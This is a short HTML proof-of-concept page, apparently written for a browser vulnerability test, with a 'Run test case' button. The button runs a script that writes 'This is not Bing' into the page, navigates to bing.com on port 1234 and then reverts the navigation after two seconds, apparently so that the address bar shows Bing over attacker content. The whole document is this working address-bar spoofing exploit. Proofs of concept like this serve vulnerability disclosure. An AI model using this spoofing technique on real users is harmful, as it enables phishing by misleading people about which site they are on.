<html>
<head>
  <title>Proof of Concept</title>
</head>
<body>
<script>
  function spoof() {
    document.write("<h1>This is not Bing</h1>");
    document.location = "https://bing.com:1234";

    // Set a timeout to stop loading after 2 seconds (2000 milliseconds)
    setTimeout(function() {
      // Stay on the current page and do not continue loading
      document.location = document.URL;
    }, 2000);
  };
</script>

<p class="test">
  <input class="btn btn-success btn-lg" type="button" value="Run test case" onclick="spoof();" />
</p>

</body>
</html>
